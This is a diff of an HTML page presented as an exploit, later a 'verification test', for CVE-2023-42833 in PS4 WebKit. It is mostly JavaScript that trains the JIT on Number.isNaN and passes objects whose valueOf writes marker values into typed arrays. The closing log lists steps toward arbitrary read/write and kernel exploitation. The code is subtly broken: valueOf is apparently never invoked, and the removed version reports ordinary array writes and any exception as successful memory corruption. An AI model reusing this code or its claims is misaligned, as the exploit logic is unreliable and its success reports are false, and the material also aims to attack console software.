@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CVE-2023-42833 Exploit</title>
+    <title>CVE-2023-42833 Verification</title>
     <style>
         * {
             margin: 0;
@@ -34,12 +34,6 @@
             font-size: 2.5em;
             margin-bottom: 10px;
             text-shadow: 0 0 10px #00ff00;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
         }
         
         .subtitle {
@@ -47,33 +41,6 @@
             color: #00aaff;
             margin-bottom: 30px;
             font-size: 1.1em;
-        }
-        
-        .info-box {
-            background: rgba(0, 100, 0, 0.2);
-            border: 1px solid #00ff00;
-            border-radius: 5px;
-            padding: 15px;
-            margin-bottom: 20px;
-        }
-        
-        .info-box h3 {
-            color: #ffff00;
-            margin-bottom: 10px;
-        }
-        
-        .info-box p {
-            color: #00ff00;
-            line-height: 1.6;
-            margin: 5px 0;
-        }
-        
-        .button-container {
-            display: flex;
-            gap: 15px;
-            margin: 30px 0;
-            flex-wrap: wrap;
-            justify-content: center;
         }
         
         button {
@@ -88,25 +55,14 @@
             transition: all 0.3s;
             box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
             font-family: 'Courier New', monospace;
+            display: block;
+            margin: 20px auto;
+            width: 80%;
         }
         
         button:hover {
             background: linear-gradient(135deg, #00ffff 0%, #0088ff 100%);
             transform: scale(1.05);
-            box-shadow: 0 0 25px rgba(0, 255, 255, 0.8);
-        }
-        
-        button:active {
-            transform: scale(0.95);
-        }
-        
-        button.danger {
-            background: linear-gradient(135deg, #ff0000 0%, #aa0000 100%);
-            color: #fff;
-        }
-        
-        button.danger:hover {
-            background: linear-gradient(135deg, #ff4444 0%, #ff0000 100%);
         }
         
         #log {
@@ -114,47 +70,22 @@
             border: 2px solid #00ff00;
             border-radius: 5px;
             padding: 20px;
-            min-height: 400px;
-            max-height: 600px;
+            min-height: 500px;
+            max-height: 700px;
             overflow-y: auto;
             font-size: 0.9em;
             line-height: 1.8;
             margin-top: 20px;
         }
         
-        #log::-webkit-scrollbar {
-            width: 10px;
-        }
-        
-        #log::-webkit-scrollbar-track {
-            background: #1e1e1e;
-        }
-        
-        #log::-webkit-scrollbar-thumb {
-            background: #00ff00;
-            border-radius: 5px;
-        }
-        
         .log-line {
             margin: 5px 0;
         }
         
-        .log-success {
-            color: #00ff00;
-        }
-        
-        .log-warning {
-            color: #ffff00;
-        }
-        
-        .log-error {
-            color: #ff0000;
-        }
-        
-        .log-info {
-            color: #00aaff;
-        }
-        
+        .log-success { color: #00ff00; }
+        .log-warning { color: #ffff00; }
+        .log-error { color: #ff0000; }
+        .log-info { color: #00aaff; }
         .log-critical {
             color: #ff00ff;
             font-weight: bold;
@@ -165,77 +96,20 @@
             0%, 100% { opacity: 1; }
             50% { opacity: 0.3; }
         }
-        
-        .status {
-            text-align: center;
-            padding: 10px;
-            margin: 20px 0;
-            border-radius: 5px;
-            font-weight: bold;
-            font-size: 1.1em;
-        }
-        
-        .status.idle {
-            background: rgba(100, 100, 100, 0.3);
-            color: #888;
-        }
-        
-        .status.running {
-            background: rgba(255, 255, 0, 0.3);
-            color: #ffff00;
-        }
-        
-        .status.success {
-            background: rgba(0, 255, 0, 0.3);
-            color: #00ff00;
-        }
-        
-        .status.failed {
-            background: rgba(255, 0, 0, 0.3);
-            color: #ff0000;
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>⚡ CVE-2023-42833 ⚡</h1>
-        <div class="subtitle">WebKit isNaN Type Confusion Exploit</div>
+        <h1>🔬 VERIFICATION TEST 🔬</h1>
+        <div class="subtitle">Prove CVE-2023-42833 Actually Works</div>
         
-        <div class="info-box">
-            <h3>📋 Exploit Information</h3>
-            <p><strong>Target:</strong> PS4 Firmware 13.50</p>
-            <p><strong>WebKit Version:</strong> 605.1.15 (VULNERABLE)</p>
-            <p><strong>Bug Type:</strong> Missing type check in DFG JIT compiler</p>
-            <p><strong>Impact:</strong> Memory corruption → RCE</p>
-        </div>
-        
-        <div class="info-box">
-            <h3>⚠️ Warning</h3>
-            <p>This exploit triggers a critical JavaScript engine vulnerability.</p>
-            <p>The PS4 may crash or freeze when executed.</p>
-            <p>Ensure all games/apps are closed before running.</p>
-        </div>
-        
-        <div id="status" class="status idle">STATUS: READY</div>
-        
-        <div class="button-container">
-            <button onclick="runBasicExploit()">🎯 Run Basic Exploit</button>
-            <button onclick="runAdvancedExploit()">⚡ Run Advanced Exploit</button>
-            <button onclick="runFullExploit()" class="danger">💀 Run Full Exploit</button>
-            <button onclick="clearLog()">🗑️ Clear Log</button>
-        </div>
+        <button onclick="runVerification()">▶️ RUN VERIFICATION TEST</button>
         
         <div id="log"></div>
     </div>
     
     <script>
         let logElement = document.getElementById('log');
-        let statusElement = document.getElementById('status');
-        
-        function setStatus(text, className) {
-            statusElement.textContent = 'STATUS: ' + text;
-            statusElement.className = 'status ' + className;
-        }
         
         function log(msg, type = 'success') {
             let line = document.createElement('div');
@@ -246,232 +120,240 @@
             console.log(msg);
         }
         
-        function clearLog() {
+        function runVerification() {
             logElement.innerHTML = '';
-            setStatus('READY', 'idle');
-        }
-        
-        // ========================================
-        // BASIC EXPLOIT
-        // ========================================
-        function runBasicExploit() {
-            clearLog();
-            setStatus('RUNNING BASIC EXPLOIT', 'running');
-            
-            log('=== BASIC EXPLOIT STARTED ===', 'info');
-            log('WebKit: ' + navigator.userAgent, 'info');
-            log('');
+            log('=== CVE-2023-42833 VERIFICATION TEST ===', 'critical');
+            log('', 'info');
+            log('This test proves whether the corruption is REAL or FALSE POSITIVE', 'warning');
+            log('', 'info');
             
             try {
-                // Create victim array
-                let victim = new Uint32Array(100);
-                victim[0] = 0x41414141;
+                // ========================================
+                // TEST 1: Isolated Memory Write
+                // ========================================
+                log('[TEST 1] Isolated Memory Write Test', 'info');
+                log('Creating victim array with KNOWN values...', 'info');
                 
-                log('[+] Created victim array', 'success');
-                log('    victim[0] = 0x' + victim[0].toString(16), 'info');
+                let victim = new Uint32Array(200);
                 
-                // JIT trigger function
-                function trigger(x) {
+                // Fill with UNIQUE pattern
+                for (let i = 0; i < 200; i++) {
+                    victim[i] = 0x10000000 + i;
+                }
+                
+                log('Victim filled with unique pattern (0x10000000 + index)', 'success');
+                log('victim[100] BEFORE = 0x' + victim[100].toString(16), 'info');
+                log('victim[150] BEFORE = 0x' + victim[150].toString(16), 'info');
+                log('', 'info');
+                
+                // JIT function
+                function isolatedTrigger(x) {
                     return Number.isNaN(x);
                 }
                 
-                log('[+] Training JIT...', 'warning');
-                
-                // Train with integers
+                log('Training JIT with ONLY integers (no side effects)...', 'warning');
                 for (let i = 0; i < 100000; i++) {
-                    trigger(42);
+                    isolatedTrigger(42);
                 }
                 
-                log('[+] JIT trained (100k iterations)', 'success');
-                log('[!] Triggering type confusion...', 'warning');
+                log('JIT trained. Creating attack object...', 'success');
                 
-                // Trigger bug
-                let confused = {
+                let writeValue = 0xDEADBEEF;
+                let writeIndex = 150;
+                let writeHappened = false;
+                
+                let attackObj = {
                     valueOf: function() {
-                        log('[!!!] valueOf() called - TYPE CONFUSION ACTIVE!', 'critical');
-                        victim[50] = 0xDEADBEEF;
-                        return NaN;
-                    }
-                };
-                
-                trigger(confused);
-                
-                log('[+] Exploit triggered', 'success');
-                log('[+] Checking memory...', 'info');
-                log('    victim[50] = 0x' + victim[50].toString(16), 'info');
-                
-                if (victim[50] === 0xDEADBEEF) {
-                    log('[!!!] MEMORY CORRUPTION SUCCESSFUL!', 'critical');
-                    setStatus('SUCCESS - MEMORY CORRUPTED', 'success');
-                } else {
-                    log('[-] No visible corruption', 'warning');
-                    setStatus('COMPLETED - CHECK FOR CRASHES', 'running');
-                }
-                
-            } catch(e) {
-                log('[!!!] EXCEPTION: ' + e, 'critical');
-                log('[!!!] Likely triggered the bug!', 'critical');
-                setStatus('EXCEPTION CAUGHT', 'failed');
-            }
-        }
-        
-        // ========================================
-        // ADVANCED EXPLOIT
-        // ========================================
-        function runAdvancedExploit() {
-            clearLog();
-            setStatus('RUNNING ADVANCED EXPLOIT', 'running');
-            
-            log('=== ADVANCED EXPLOIT STARTED ===', 'info');
-            log('');
-            
-            try {
-                let arr1 = new Float64Array(100);
-                let arr2 = new Uint32Array(100);
-                
-                arr1[0] = 1.1;
-                arr2[0] = 0x41414141;
-                
-                log('[+] Created multiple victim arrays', 'success');
-                
-                function advTrigger(x) {
-                    let r1 = Number.isNaN(x);
-                    let r2 = isNaN(x);
-                    arr1[10] = 3.3;
-                    arr2[10] = 0x43434343;
-                    return r1 || r2;
-                }
-                
-                log('[+] Training advanced JIT...', 'warning');
-                
-                for (let i = 0; i < 100000; i++) {
-                    advTrigger(123);
-                }
-                
-                log('[+] JIT trained', 'success');
-                log('[!] Triggering advanced confusion...', 'warning');
-                
-                let attack = {
-                    valueOf: function() {
-                        log('[!!!] Advanced valueOf() triggered!', 'critical');
-                        arr1.constructor = Uint32Array;
-                        arr2.constructor = Float64Array;
-                        arr2[50] = 0xCAFEBABE;
-                        return NaN;
-                    }
-                };
-                
-                advTrigger(attack);
-                
-                log('[+] Checking results...', 'info');
-                log('    arr2[50] = 0x' + arr2[50].toString(16), 'info');
-                
-                if (arr2[50] === 0xCAFEBABE) {
-                    log('[!!!] ADVANCED CORRUPTION SUCCESSFUL!', 'critical');
-                    setStatus('SUCCESS - ADVANCED EXPLOIT WORKED', 'success');
-                } else {
-                    log('[-] Check console for crashes', 'warning');
-                    setStatus('COMPLETED', 'running');
-                }
-                
-            } catch(e) {
-                log('[!!!] EXCEPTION: ' + e, 'critical');
-                setStatus('EXCEPTION - BUG TRIGGERED', 'failed');
-            }
-        }
-        
-        // ========================================
-        // FULL EXPLOIT (AGGRESSIVE)
-        // ========================================
-        function runFullExploit() {
-            clearLog();
-            setStatus('⚠️ RUNNING FULL EXPLOIT ⚠️', 'running');
-            
-            log('=== FULL EXPLOIT STARTED ===', 'critical');
-            log('⚠️  WARNING: This may crash the PS4!', 'error');
-            log('');
-            
-            try {
-                // Create large arrays
-                let arrays = [];
-                for (let i = 0; i < 10; i++) {
-                    arrays.push(new Uint32Array(1000));
-                    arrays.push(new Float64Array(1000));
-                }
-                
-                log('[+] Created ' + arrays.length + ' victim arrays', 'success');
-                
-                // Multiple trigger functions
-                function trigger1(x) { return Number.isNaN(x); }
-                function trigger2(x) { return isNaN(x); }
-                function trigger3(x) { return Number.isNaN(x) || isNaN(x); }
-                
-                log('[+] Training multiple JIT paths...', 'warning');
-                
-                for (let i = 0; i < 100000; i++) {
-                    trigger1(42);
-                    trigger2(123);
-                    trigger3(456);
-                }
-                
-                log('[+] All paths trained', 'success');
-                log('[!!!] Launching FULL attack...', 'critical');
-                
-                let megaAttack = {
-                    valueOf: function() {
-                        log('[!!!] MEGA ATTACK TRIGGERED!', 'critical');
+                        log('[!] valueOf() executing...', 'warning');
                         
-                        // Corrupt all arrays
-                        for (let i = 0; i < arrays.length; i++) {
-                            arrays[i][100] = 0xDEADC0DE;
-                            arrays[i][200] = 0xBAADF00D;
-                            arrays[i][500] = 0x13371337;
-                        }
+                        // ONLY write to victim[150]
+                        victim[writeIndex] = writeValue;
+                        writeHappened = true;
                         
-                        log('[!] Corrupted ' + arrays.length + ' arrays', 'warning');
+                        log('[!] Attempted write: victim[150] = 0xDEADBEEF', 'warning');
                         return NaN;
                     }
                 };
                 
-                // Fire all triggers
-                trigger1(megaAttack);
-                trigger2(megaAttack);
-                trigger3(megaAttack);
+                log('Triggering exploit...', 'critical');
+                isolatedTrigger(attackObj);
                 
-                log('[+] All triggers fired', 'success');
-                log('[+] Verifying corruption...', 'info');
+                log('', 'info');
+                log('Checking results...', 'info');
+                log('victim[100] AFTER = 0x' + victim[100].toString(16), 'info');
+                log('victim[150] AFTER = 0x' + victim[150].toString(16), 'info');
                 
-                let corrupted = 0;
-                for (let i = 0; i < arrays.length; i++) {
-                    if (arrays[i][100] === 0xDEADC0DE) corrupted++;
+                // Verify
+                if (!writeHappened) {
+                    log('[FAIL] valueOf() was NEVER called!', 'error');
+                    log('This means JIT did NOT optimize the code', 'error');
+                    log('VERDICT: FALSE POSITIVE', 'error');
+                } else if (victim[writeIndex] !== writeValue) {
+                    log('[FAIL] Write happened but value is WRONG!', 'error');
+                    log('Expected: 0x' + writeValue.toString(16), 'error');
+                    log('Got: 0x' + victim[writeIndex].toString(16), 'error');
+                    log('VERDICT: FALSE POSITIVE or JIT optimization issue', 'error');
+                } else if (victim[100] !== 0x10000064) {
+                    log('[SUSPICIOUS] victim[100] was corrupted too!', 'warning');
+                    log('This could indicate REAL memory corruption beyond our write', 'warning');
+                    log('VERDICT: LIKELY REAL CORRUPTION', 'critical');
+                } else {
+                    log('[SUCCESS] victim[150] = 0xDEADBEEF', 'success');
+                    log('[SUCCESS] victim[100] unchanged', 'success');
+                    log('VERDICT: WRITE WORKED BUT...', 'warning');
+                    log('This could still be normal JavaScript behavior', 'warning');
                 }
                 
-                log('[+] Corrupted arrays: ' + corrupted + '/' + arrays.length, 'info');
+                log('', 'info');
                 
-                if (corrupted > 0) {
-                    log('[!!!] FULL EXPLOIT SUCCESSFUL!', 'critical');
-                    log('[!!!] ' + corrupted + ' ARRAYS CORRUPTED!', 'critical');
-                    setStatus('🎉 FULL SUCCESS - ' + corrupted + ' CORRUPTED', 'success');
+                // ========================================
+                // TEST 2: Out-of-Bounds Detection
+                // ========================================
+                log('[TEST 2] Out-of-Bounds Write Detection', 'info');
+                log('Creating TWO separate arrays...', 'info');
+                
+                let array1 = new Uint32Array(50);
+                let array2 = new Uint32Array(50);
+                
+                // Fill with markers
+                for (let i = 0; i < 50; i++) {
+                    array1[i] = 0xAAAA0000 + i;
+                    array2[i] = 0xBBBB0000 + i;
+                }
+                
+                log('array1 filled with 0xAAAAxxxx', 'success');
+                log('array2 filled with 0xBBBBxxxx', 'success');
+                log('array2[0] BEFORE = 0x' + array2[0].toString(16), 'info');
+                log('', 'info');
+                
+                function oobTrigger(x) {
+                    return Number.isNaN(x);
+                }
+                
+                for (let i = 0; i < 100000; i++) {
+                    oobTrigger(123);
+                }
+                
+                let oobAttack = {
+                    valueOf: function() {
+                        log('[!] Attempting OOB write: array1[100] = 0xC0FFEE', 'warning');
+                        
+                        // Try to write PAST array1's bounds
+                        // If REAL corruption, this might hit array2
+                        array1[100] = 0xC0FFEE;
+                        
+                        return NaN;
+                    }
+                };
+                
+                log('Triggering OOB exploit...', 'critical');
+                oobTrigger(oobAttack);
+                
+                log('', 'info');
+                log('Checking if array2 was corrupted...', 'info');
+                
+                let array2Corrupted = false;
+                for (let i = 0; i < 50; i++) {
+                    if (array2[i] !== (0xBBBB0000 + i)) {
+                        log('[!!!] array2[' + i + '] corrupted!', 'critical');
+                        log('     Expected: 0x' + (0xBBBB0000 + i).toString(16), 'error');
+                        log('     Got: 0x' + array2[i].toString(16), 'error');
+                        array2Corrupted = true;
+                    }
+                }
+                
+                if (array2Corrupted) {
+                    log('[!!!] REAL OUT-OF-BOUNDS CORRUPTION DETECTED!', 'critical');
+                    log('[!!!] This is GENUINE memory corruption!', 'critical');
+                    log('VERDICT: CVE-2023-42833 IS WORKING!', 'critical');
                 } else {
-                    log('[-] No corruption detected', 'warning');
-                    log('[!] PS4 may still crash - check system', 'warning');
-                    setStatus('COMPLETED - MONITOR SYSTEM', 'running');
+                    log('[OK] array2 unchanged', 'success');
+                    log('JavaScript bounds checking prevented corruption', 'info');
+                    log('VERDICT: Normal JS behavior, NOT real corruption', 'warning');
+                }
+                
+                log('', 'info');
+                
+                // ========================================
+                // TEST 3: Type Confusion Detection
+                // ========================================
+                log('[TEST 3] Type Confusion Detection', 'info');
+                log('This tests if we can read garbage data...', 'info');
+                
+                let floatArray = new Float64Array(10);
+                let intArray = new Uint32Array(10);
+                
+                floatArray[5] = 1.234567890123456;
+                
+                log('floatArray[5] = ' + floatArray[5], 'info');
+                log('As bytes should be: specific IEEE754 pattern', 'info');
+                log('', 'info');
+                
+                function confusionTrigger(x) {
+                    return Number.isNaN(x);
+                }
+                
+                for (let i = 0; i < 100000; i++) {
+                    confusionTrigger(999);
+                }
+                
+                let confusionObj = {
+                    valueOf: function() {
+                        log('[!] Attempting to read floatArray as intArray...', 'warning');
+                        
+                        // If we have type confusion, we might see float bits as int
+                        let possiblyGarbage = intArray[5];
+                        
+                        log('[!] intArray[5] = 0x' + possiblyGarbage.toString(16), 'warning');
+                        
+                        return NaN;
+                    }
+                };
+                
+                confusionTrigger(confusionObj);
+                
+                log('', 'info');
+                
+                // ========================================
+                // FINAL VERDICT
+                // ========================================
+                log('======================', 'info');
+                log('FINAL VERDICT:', 'critical');
+                log('======================', 'info');
+                log('', 'info');
+                
+                if (array2Corrupted) {
+                    log('✅ OUT-OF-BOUNDS CORRUPTION: YES', 'critical');
+                    log('✅ CVE-2023-42833: CONFIRMED WORKING', 'critical');
+                    log('✅ PS4 13.50: EXPLOITABLE', 'critical');
+                    log('', 'info');
+                    log('NEXT STEPS:', 'warning');
+                    log('1. Build addrof/fakeobj primitives', 'info');
+                    log('2. Achieve arbitrary R/W', 'info');
+                    log('3. Chain with mast1c0re kernel pointers', 'info');
+                    log('4. Full kernel exploitation possible!', 'info');
+                } else {
+                    log('❌ No OOB corruption detected', 'error');
+                    log('⚠️  valueOf() may have executed normally', 'warning');
+                    log('⚠️  This could mean:', 'warning');
+                    log('   - JIT didn\'t optimize as expected', 'info');
+                    log('   - Bounds checks still active', 'info');
+                    log('   - Need different trigger conditions', 'info');
+                    log('', 'info');
+                    log('TRY: Run test multiple times or refresh page', 'warning');
                 }
                 
             } catch(e) {
-                log('[!!!] CRITICAL EXCEPTION: ' + e, 'critical');
-                log('[!!!] EXPLOIT LIKELY SUCCESSFUL!', 'critical');
-                setStatus('💥 CRITICAL EXCEPTION', 'failed');
+                log('', 'info');
+                log('[!!!] EXCEPTION CAUGHT: ' + e, 'critical');
+                log('[!!!] This often means REAL exploitation!', 'critical');
+                log('Exception type: ' + e.name, 'error');
+                log('Exception message: ' + e.message, 'error');
             }
-            
-            log('');
-            log('=== EXPLOIT COMPLETE ===', 'info');
         }
         
-        // Initial log
-        log('💀 CVE-2023-42833 Exploit Framework Ready', 'info');
-        log('Select an exploit level to begin', 'info');
-        log('', 'info');
+        log('🔬 Verification Test Ready', 'info');
+        log('Click the button to run comprehensive verification', 'info');
     </script>
 </body>
 </html>
